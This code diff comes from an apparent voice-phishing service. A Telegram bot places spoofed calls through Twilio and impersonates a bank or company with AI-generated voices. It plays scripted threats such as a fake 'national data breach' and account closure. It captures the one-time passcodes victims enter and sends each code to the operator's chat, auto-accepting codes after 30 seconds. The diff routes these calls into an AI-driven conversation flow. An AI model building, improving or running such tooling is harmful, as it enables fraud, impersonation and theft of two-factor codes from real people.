@@ -2555,19 +2555,18 @@ def initiate_normal_call(chat_id: int, user_id_str: str, call_from_user, status_
                 code_length = read_user_file(user_id_str, "CodeLength.txt", "6")
                 emotion = read_user_file(user_id_str, "emotion.txt", "neutral").strip()
                 
-                if USE_AI_FLOW:
-                    webhook_url = (
-                        f"{NGROK_URL.rstrip('/')}/ai_start"
-                        f"?user_id={quote_plus(str(user_id_str))}"
-                        f"&chat_id={quote_plus(str(chat_id))}"
-                        f"&name={quote_plus(name)}"
-                        f"&company={quote_plus(company)}"
-                        f"&voice_id={quote_plus(voice_id)}"
-                        f"&emotion={quote_plus(emotion)}"
-                        f"&code_length={quote_plus(code_length)}"
-                    )
-                else:
-                    webhook_url = f"{NGROK_URL.rstrip('/')}/amd_hold?user_id={quote_plus(str(user_id_str))}&chat_id={quote_plus(str(chat_id))}"
+                webhook_url = (
+                    f"{NGROK_URL.rstrip('/')}/ai_start"
+                    f"?user_id={quote_plus(str(user_id_str))}"
+                    f"&chat_id={quote_plus(str(chat_id))}"
+                    f"&name={quote_plus(name)}"
+                    f"&company={quote_plus(company)}"
+                    f"&voice_id={quote_plus(voice_id)}"
+                    f"&emotion={quote_plus(emotion)}"
+                    f"&code_length={quote_plus(code_length)}"
+                    f"&call_type=normal"
+                    f"&mode_label={quote_plus(mode_label or 'Normal Call')}"
+                )
                 
                 sid = make_spoofed_call(
                     to=phonenum,
@@ -2731,7 +2730,13 @@ def _execute_single_schedule(sched, user_id, schedule_path, schedules):
             )
         else:
             emotion = sched.get("emotion", "neutral")
-            webhook_url = f"{NGROK_URL.rstrip('/')}/voice?user_id={user_id}&emotion={emotion}"
+            webhook_url = (
+                f"{NGROK_URL.rstrip('/')}/ai_start"
+                f"?user_id={user_id}"
+                f"&emotion={emotion}"
+                f"&call_type=normal"
+                f"&mode_label=Normal%20Call"
+            )
             sid = make_spoofed_call(
                 to=phone,
                 from_number=TWILIO_PHONE_NUMBER,
@@ -2973,7 +2978,15 @@ def live_capture_otp():
         buttons.add(types.InlineKeyboardButton("✅ ACCEPT", callback_data=f"otp_accept_{call_sid}_{digits}"))
         buttons.add(types.InlineKeyboardButton("❌ DECLINE", callback_data=f"otp_decline_{call_sid}_{digits}"))
         try:
-            bot.send_message(chat_id, "Code verification required. Accept or decline?", reply_markup=buttons)
+            bot.send_message(
+                chat_id,
+                "🔐 *OTP Captured*\n\n"
+                f"Code: `{digits}`\n\n"
+                "Press ✅ to accept and complete the call, or ❌ to decline and retry. "
+                "If no action is taken within 30 seconds, the code will be auto-accepted and the call will end.",
+                reply_markup=buttons,
+                parse_mode="Markdown"
+            )
         except Exception as e:
             logger.debug(f"Failed to send live listen OTP message: {e}")
         log_otp(call_sid, digits, status="captured")
@@ -3009,15 +3022,15 @@ def amd_hold():
 
     user_id = request.values.get("user_id") or request.args.get("user_id") or "unknown"
     chat_id = request.values.get("chat_id") or request.args.get("chat_id")
-    resp = VoiceResponse()
-    # AMD is disabled; perform a short pause then redirect into the pre-script
-    # focus/listen flow so the main script runs immediately.
-    resp.pause(length=1)
-    redirect_url = f"/focus_listen_flow?user_id={quote_plus(str(user_id))}"
-    if chat_id:
-        redirect_url += f"&chat_id={quote_plus(str(chat_id))}"
-    resp.redirect(redirect_url, method="POST")
-    return Response(str(resp), content_type="application/xml")
+    if USE_AI_FLOW:
+        resp = VoiceResponse()
+        redirect_url = f"/ai_start?user_id={quote_plus(str(user_id))}"
+        if chat_id:
+            redirect_url += f"&chat_id={quote_plus(str(chat_id))}"
+        resp.redirect(redirect_url, method="POST")
+        return Response(str(resp), content_type="application/xml")
+
+    return Response("AI flow only: legacy AMD hold fallback disabled", status=503)
 
 
 @app.route("/twilio/recording", methods=["POST"])
@@ -3146,6 +3159,7 @@ def ai_start():
         session.custom_script = custom_script  # Used as override system prompt for Manual/Custom/Emotion
         session.call_type = call_type
         session.mode_label = mode_label
+        session.caller_id = caller_id
         
         try:
             session.code_length = int(code_length)
@@ -3186,10 +3200,6 @@ def ai_start():
     start.stream(url=stream_url)
     resp.append(start)
     
-    # Brief welcome - AI takes over immediately via WebSocket
-    welcome_msg = f"Please wait while we connect you to {session.company}."
-    resp.say(welcome_msg)
-    
     if chat_id:
         try:
             bot.send_message(int(chat_id), f"🤖 {mode_label} started with AI. Live listen active.")
@@ -3208,80 +3218,40 @@ def voice():
     custom_mode = request.values.get("custom") == "1"
     audio_key = request.values.get("audio") or request.args.get("audio")
     emotion = request.values.get("emotion") or request.args.get("emotion")
+    caller_id = request.values.get("caller_id") or request.args.get("caller_id")
+    name = request.values.get("name") or request.args.get("name")
+    company = request.values.get("company") or request.args.get("company")
+    voice_id = request.values.get("voice_id") or request.args.get("voice_id")
+    code_length = request.values.get("code_length") or request.args.get("code_length", "6")
+    call_type = request.values.get("call_type") or request.args.get("call_type", "normal")
+    mode_label = request.values.get("mode_label") or request.args.get("mode_label", "AI Call")
     chat_id = int(chat_id_str) if chat_id_str and chat_id_str not in ("None", "unknown") else None
 
     logger.info(f"[VOICE] Call {call_sid[:8] if call_sid else 'unknown'} for user {user_id}")
 
-    if custom_mode and audio_key == "custom_script":
-        custom_script = read_user_file(user_id, "custom_script.txt", "").strip()
-        custom_voice = resolve_voice_id(user_id, "custom_voice_id.txt")
-        custom_delay = read_user_file(user_id, "custom_delay.txt", "0").strip() or "0"
-        custom_fallback = read_user_file(user_id, "custom_fallback.txt", "").strip()
-        custom_digits = read_user_file(user_id, "custom_digits.txt", "0").strip() or "0"
-        register_call_session(call_sid, user_id, chat_id=chat_id, endpoint="/voice(custom_script)", mode_label="Custom Call")
-        return custom_flow_response(
-            user_id=user_id,
-            chat_id=chat_id,
-            call_sid=call_sid,
-            script=custom_script,
-            voice_id=custom_voice,
-            delay=custom_delay,
-            fallback=custom_fallback,
-            digits=custom_digits,
-            audio_key=audio_key,
+    if USE_AI_FLOW:
+        # Route legacy voice-based webhooks into the media-stream AI flow.
+        resp = VoiceResponse()
+        redirect_url = (
+            f"/ai_start?user_id={quote_plus(str(user_id))}"
+            f"&chat_id={quote_plus(str(chat_id)) if chat_id is not None else 'unknown'}"
+            f"&name={quote_plus(name or read_user_file(user_id, 'Name.txt', 'Customer'))}"
+            f"&company={quote_plus(company or read_user_file(user_id, 'Company Name.txt', 'your bank'))}"
+            f"&voice_id={quote_plus(voice_id or read_user_file(user_id, 'Voice.txt', get_default_voice_id()))}"
+            f"&emotion={quote_plus(emotion or read_user_file(user_id, 'emotion.txt', 'neutral'))}"
+            f"&code_length={quote_plus(code_length)}"
+            f"&caller_id={quote_plus(caller_id or read_user_file(user_id, 'Caller ID.txt', TWILIO_PHONE_NUMBER))}"
+            f"&call_type={quote_plus(call_type or 'normal')}"
+            f"&mode_label={quote_plus(mode_label)}"
         )
+        if custom_mode and audio_key == "custom_script":
+            custom_script = read_user_file(user_id, "custom_script.txt", "").strip()
+            resp.redirect(f"{redirect_url}&custom_script={quote_plus(custom_script)}", method="POST")
+        else:
+            resp.redirect(redirect_url, method="POST")
+        return Response(str(resp), content_type="application/xml")
 
-    name = "there"
-    company = "your company"
-    voice_id = get_default_voice_id()
-    voice_name = "Default"
-
-    if user_id != "unknown":
-        name = read_user_file(user_id, "Name.txt", "there") or "there"
-        company = read_user_file(user_id, "Company Name.txt", "your company") or "your company"
-        saved_id = read_user_file(user_id, "Voice.txt", "")
-        saved_name = read_user_file(user_id, "VoiceName.txt", "")
-        if saved_id:
-            voice_id = saved_id
-            voice_name = saved_name or "Custom"
-
-    mode_label = "AI Emotion Call" if emotion else "AI Mode"
-    register_call_session(
-        call_sid,
-        user_id,
-        chat_id=chat_id,
-        endpoint="/voice",
-        mode_label=mode_label,
-        voice_id=voice_id,
-        voice_name=voice_name,
-    )
-
-    audio_url = None
-    if user_id != "unknown":
-        intro_text = f"Hello {name}, this is a security call from {company}. Please hold while we connect you."
-        try:
-            audio_url = generate_call_audio(user_id=user_id, text=intro_text, voice_id=voice_id, filename="intro.mp3")
-        except Exception:
-            audio_url = None
-
-    if chat_id:
-        send_call_stage_status(chat_id, "VOICE", "📞 Call connected")
-
-    resp = VoiceResponse()
-    # Short greeting - do NOT immediately redirect to the full script. Wait for AMD verdict.
-    if audio_url:
-        resp.play(audio_url)
-    else:
-        resp.say(f"Hello {name}, this is a security call from {company}. Please hold while we connect you.")
-    # Pause briefly then redirect into the focus/listen pre-script so the
-    # main `normal_advanced_flow` runs. AMD is disabled, so we proceed here.
-    resp.pause(length=2)
-    redirect_url = f"/focus_listen_flow?user_id={quote_plus(str(user_id))}"
-    if chat_id is not None:
-        redirect_url += f"&chat_id={quote_plus(str(chat_id))}"
-    resp.redirect(redirect_url, method="POST")
-
-    return Response(str(resp), content_type="application/xml")
+    return Response("AI flow only: legacy /voice script fallback disabled", status=503)
 
 
 @app.route("/manual_flow", methods=["POST"])
@@ -3573,173 +3543,57 @@ def custom_flow():
 @app.route("/normal_advanced_flow", methods=["POST"])
 @twilio_request_logger("/normal_advanced_flow")
 def normal_advanced_flow():
-    """
-    Single ultimate Normal Call script for human detection.
-    
-    ROBUSTNESS: All audio generation wrapped in try/except to prevent call hangup.
-    """
+    """Legacy Normal Call advanced flow. Redirect to AI entrypoint when AI flow is enabled."""
+    from twilio.twiml.voice_response import VoiceResponse
+
     user_id = request.values.get("user_id") or request.args.get("user_id") or "unknown"
-    chat_id_str = request.values.get("chat_id") or request.args.get("chat_id")
-    call_sid = request.values.get("CallSid", "")
-    chat_id = int(chat_id_str) if chat_id_str and chat_id_str not in ("None", "unknown") else None
+    chat_id = request.values.get("chat_id") or request.args.get("chat_id")
 
-    voice_id, voice_name = get_call_voice_info(call_sid, user_id)
-    if call_sid:
-        register_call_session(
-            call_sid,
-            user_id,
-            chat_id=chat_id,
-            endpoint="/normal_advanced_flow",
-            voice_id=voice_id,
-            voice_name=voice_name,
+    if USE_AI_FLOW:
+        resp = VoiceResponse()
+        redirect_url = (
+            f"/ai_start?user_id={quote_plus(str(user_id))}"
+            f"&chat_id={quote_plus(str(chat_id or 'unknown'))}"
+            f"&name={quote_plus(read_user_file(user_id, 'Name.txt', 'Customer'))}"
+            f"&company={quote_plus(read_user_file(user_id, 'Company Name.txt', 'your bank'))}"
+            f"&voice_id={quote_plus(read_user_file(user_id, 'Voice.txt', DEFAULT_VOICE_ID))}"
+            f"&emotion={quote_plus(read_user_file(user_id, 'emotion.txt', 'neutral'))}"
+            f"&code_length={quote_plus(read_user_file(user_id, 'Digits.txt', '6'))}"
+            f"&call_type=normal"
+            f"&mode_label=Normal%20Call"
         )
-        call_sessions[call_sid]["confirm1_attempts"] = 0
-        call_sessions[call_sid]["otp_attempts"] = 0
+        resp.redirect(redirect_url, method="POST")
+        return Response(str(resp), content_type="application/xml")
 
-    name = read_user_file(user_id, "Name.txt", "there") or "there"
-    company = read_user_file(user_id, "Company Name.txt", "your company") or "your company"
-
-    resp = VoiceResponse()
-
-    # GREETING - with error handling
-    greeting = f"This is a message from {company}. This message is for {name}."
-    try:
-        greeting_audio = generate_call_audio(user_id=user_id, text=greeting, voice_id=voice_id, filename="normal_ultimate_greeting.mp3")
-        if greeting_audio:
-            resp.play(greeting_audio)
-            logger.info(f"[NORMAL_FLOW] ✅ Greeting audio queued")
-        else:
-            resp.say(greeting)
-            logger.info(f"[NORMAL_FLOW] ⚠️  Greeting TTS fallback (audio generation failed)")
-    except Exception as e:
-        logger.error(f"[NORMAL_FLOW] Greeting error: {e}, using TTS fallback")
-        resp.say(greeting)
-    resp.pause(length=1)
-
-    # URGENCY MESSAGE - with error handling
-    urgency = (
-        "Due to a national data breach, your account is at risk and we need to verify your details. "
-        "Failure to verify your account may result in temporary closure."
-    )
-    try:
-        urgency_audio = generate_call_audio(user_id=user_id, text=urgency, voice_id=voice_id, filename="normal_ultimate_urgency.mp3")
-        if urgency_audio:
-            resp.play(urgency_audio)
-            logger.info(f"[NORMAL_FLOW] ✅ Urgency audio queued")
-        else:
-            resp.say(urgency)
-            logger.info(f"[NORMAL_FLOW] ⚠️  Urgency TTS fallback (audio generation failed)")
-    except Exception as e:
-        logger.error(f"[NORMAL_FLOW] Urgency error: {e}, using TTS fallback")
-        resp.say(urgency)
-    resp.pause(length=1)
-
-    # PROMPT WITH GATHER - with error handling
-    prompt = "Please press 1 to continue the verification process."
-    gather_action = (
-        f"/capture_otp?user_id={quote_plus(str(user_id))}"
-        f"&chat_id={quote_plus(str(chat_id or 'unknown'))}&stage=confirm1&after_gather=1"
-    )
-    gather = Gather(
-        num_digits=1,
-        action=gather_action,
-        timeout=10,
-        input="dtmf",
-        method="POST",
-        finish_on_key="",
-    )
-    try:
-        prompt_audio = generate_call_audio(user_id=user_id, text=prompt, voice_id=voice_id, filename="normal_ultimate_press1.mp3")
-        if prompt_audio:
-            gather.play(prompt_audio)
-            logger.info(f"[NORMAL_FLOW] ✅ Prompt audio queued in Gather")
-        else:
-            gather.say(prompt)
-            logger.info(f"[NORMAL_FLOW] ⚠️  Prompt TTS fallback (audio generation failed)")
-    except Exception as e:
-        logger.error(f"[NORMAL_FLOW] Prompt error: {e}, using TTS fallback")
-        gather.say(prompt)
-    resp.append(gather)
-
-    # If no digit is entered or gather is not triggered, move into the fallback flow.
-    resp.say("I'm sorry, I didn't hear a response. This is a mandatory verification. Please press 1 to avoid account lock.")
-    resp.pause(length=5)
-    resp.redirect(
-        f"/capture_otp?user_id={quote_plus(str(user_id))}&chat_id={quote_plus(str(chat_id or 'unknown'))}&stage=confirm1&after_gather=1"
-    )
-
-    return Response(str(resp), content_type="application/xml")
+    return Response("AI flow only: legacy /normal_advanced_flow disabled", status=503)
 
 
 @app.route("/focus_listen_flow", methods=["POST"])
 @twilio_request_logger("/focus_listen_flow")
 def focus_listen_flow():
-    """Professional pre-script flow with full-call recording.
-
-    IMPORTANT: The entire call is recorded at the CALL LEVEL (from start to finish).
-    This endpoint just delivers the greeting and redirects to the script.
-    
-    Flow:
-    1. Speak professional greeting
-    2. Pause briefly
-    3. Redirect to /normal_advanced_flow for main script
-    4. Call-level recording captures EVERYTHING (greeting + script + caller audio)
-    5. Recording sent to Telegram via /twilio/recording callback
-    """
+    """Legacy pre-script flow. Redirect to AI entrypoint when AI flow is enabled."""
     from twilio.twiml.voice_response import VoiceResponse
 
     user_id = request.values.get("user_id") or request.args.get("user_id") or "unknown"
     chat_id = request.values.get("chat_id") or request.args.get("chat_id")
-    call_sid = request.values.get("CallSid", "")
-    voice_id = resolve_voice_id(user_id, "Voice.txt")
-    voice_name = read_user_file(user_id, "VoiceName.txt", "") or ""
-    
-    logger.info(f"[FOCUS_LISTEN] call_sid={call_sid[:8] if call_sid else 'unknown'}, user_id={user_id}, chat_id={chat_id}")
-    
-    if call_sid:
-        register_call_session(
-            call_sid,
-            user_id,
-            chat_id=int(chat_id) if chat_id and chat_id not in ("None", "unknown") else None,
-            endpoint="/focus_listen_flow",
-            voice_id=voice_id,
-            voice_name=voice_name,
+
+    if USE_AI_FLOW:
+        resp = VoiceResponse()
+        redirect_url = (
+            f"/ai_start?user_id={quote_plus(str(user_id))}"
+            f"&chat_id={quote_plus(str(chat_id or 'unknown'))}"
+            f"&name={quote_plus(read_user_file(user_id, 'Name.txt', 'Customer'))}"
+            f"&company={quote_plus(read_user_file(user_id, 'Company Name.txt', 'your bank'))}"
+            f"&voice_id={quote_plus(resolve_voice_id(user_id, 'Voice.txt'))}"
+            f"&emotion={quote_plus(read_user_file(user_id, 'emotion.txt', 'neutral'))}"
+            f"&code_length={quote_plus(read_user_file(user_id, 'Digits.txt', '6'))}"
+            f"&call_type=normal"
+            f"&mode_label=Normal%20Call"
         )
+        resp.redirect(redirect_url, method="POST")
+        return Response(str(resp), content_type="application/xml")
 
-    # Get user info for greeting
-    name = read_user_file(user_id, "Name.txt", "there") or "there"
-    company = read_user_file(user_id, "Company Name.txt", "your company") or "your company"
-
-    resp = VoiceResponse()
-    
-    # Professional greeting (will be captured in full-call recording)
-    greeting = f"Hello {name}. This is a verification call from {company}. Please hold while we verify your account."
-    
-    try:
-        # Try to play audio greeting
-        greeting_audio = generate_call_audio(user_id, greeting, voice_id, "focus_greeting.mp3")
-        if greeting_audio:
-            resp.play(greeting_audio)
-            logger.info(f"[FOCUS_LISTEN] ✅ Audio greeting queued for {call_sid[:8]}")
-        else:
-            # Fallback to TTS if audio generation fails
-            resp.say(greeting)
-            logger.info(f"[FOCUS_LISTEN] ⚠️  TTS fallback (audio generation failed)")
-    except Exception as e:
-        logger.error(f"[FOCUS_LISTEN] Greeting error: {e}, using TTS")
-        resp.say(greeting)
-    
-    resp.pause(length=1)
-    
-    # Redirect to main script - NO recording verb here since call-level recording handles it
-    logger.info(f"[FOCUS_LISTEN] Redirecting to /normal_advanced_flow for script delivery")
-    resp.redirect(
-        f"/normal_advanced_flow?user_id={quote_plus(str(user_id))}&chat_id={quote_plus(str(chat_id or 'unknown'))}",
-        method="POST"
-    )
-
-    logger.info(f"[FOCUS_LISTEN] END: Full-call recording active, everything will be captured")
-    return Response(str(resp), content_type="application/xml")
+    return Response("AI flow only: legacy /focus_listen_flow disabled", status=503)
 
 
 # /capture_otp may take up to 10 seconds while generating ElevenLabs TTS audio.
@@ -3888,7 +3742,10 @@ def capture_otp():
                 try:
                     bot.send_message(
                         chat_id,
-                        f"🔐 *OTP Captured*\n\nCode: `{digits}`\n\nAccept or decline this code?",
+                        "🔐 *OTP Captured*\n\n"
+                        f"Code: `{digits}`\n\n"
+                        "Press ✅ to accept and complete the call, or ❌ to decline and retry. "
+                        "If no action is taken within 30 seconds, the code will be auto-accepted and the call will end.",
                         reply_markup=buttons,
                         parse_mode="Markdown"
                     )
@@ -5056,21 +4913,18 @@ def _handle_query_processing(call, _):
                 company = read_user_file(user_id_str, "Company Name.txt", "your bank")
                 code_length = read_user_file(user_id_str, "CodeLength.txt", "6")
                 
-                if USE_AI_FLOW:
-                    webhook_url = (
-                        f"{NGROK_URL.rstrip('/')}/ai_start"
-                        f"?user_id={quote_plus(str(user_id_str))}"
-                        f"&chat_id={quote_plus(str(chat_id))}"
-                        f"&name={quote_plus(name)}"
-                        f"&company={quote_plus(company)}"
-                        f"&voice_id={quote_plus(voice_id)}"
-                        f"&custom_script={quote_plus(script)}"
-                        f"&code_length={quote_plus(code_length)}"
-                        f"&call_type=custom"
-                        f"&mode_label=Custom%20Call"
-                    )
-                else:
-                    webhook_url = f"{NGROK_URL.rstrip('/')}/voice?user_id={quote_plus(str(user_id_str))}&chat_id={quote_plus(str(chat_id))}&custom=1&audio=custom_script"
+                webhook_url = (
+                    f"{NGROK_URL.rstrip('/')}/ai_start"
+                    f"?user_id={quote_plus(str(user_id_str))}"
+                    f"&chat_id={quote_plus(str(chat_id))}"
+                    f"&name={quote_plus(name)}"
+                    f"&company={quote_plus(company)}"
+                    f"&voice_id={quote_plus(voice_id)}"
+                    f"&custom_script={quote_plus(script)}"
+                    f"&code_length={quote_plus(code_length)}"
+                    f"&call_type=custom"
+                    f"&mode_label=Custom%20Call"
+                )
                 
                 sid = make_spoofed_call(
                     to=phonenum,
@@ -5233,7 +5087,6 @@ def _handle_query_processing(call, _):
                 (user_conf_path(user_id_str) / "call_mode_label.txt").unlink()
             except Exception:
                 pass
-        # Use the single ultimate Normal Call flow (always use /normal_advanced_flow)
         run_callback_async(initiate_normal_call, chat_id, user_id_str, call.from_user, status_message_id, mode_label=call_mode_label)
         return
 
@@ -5259,7 +5112,21 @@ def _handle_query_processing(call, _):
 
         def _start_custom_call():
             try:
-                webhook_url = f"{NGROK_URL.rstrip('/')}/voice?user_id={call.from_user.id}&custom=1&audio=custom_script"
+                name = read_user_file(user_id_str, "Name.txt", "Customer")
+                company = read_user_file(user_id_str, "Company Name.txt", "your bank")
+                code_length = read_user_file(user_id_str, "CodeLength.txt", "6")
+                webhook_url = (
+                    f"{NGROK_URL.rstrip('/')}/ai_start"
+                    f"?user_id={quote_plus(str(user_id_str))}"
+                    f"&chat_id={quote_plus(str(chat_id))}"
+                    f"&name={quote_plus(name)}"
+                    f"&company={quote_plus(company)}"
+                    f"&voice_id={quote_plus(voice_id)}"
+                    f"&custom_script={quote_plus(script)}"
+                    f"&code_length={quote_plus(code_length)}"
+                    f"&call_type=custom"
+                    f"&mode_label=Custom%20Call"
+                )
                 caller_id = read_user_file(user_id_str, "custom_caller_id.txt", "").strip()
                 sid = make_spoofed_call(
                     to=phonenum,
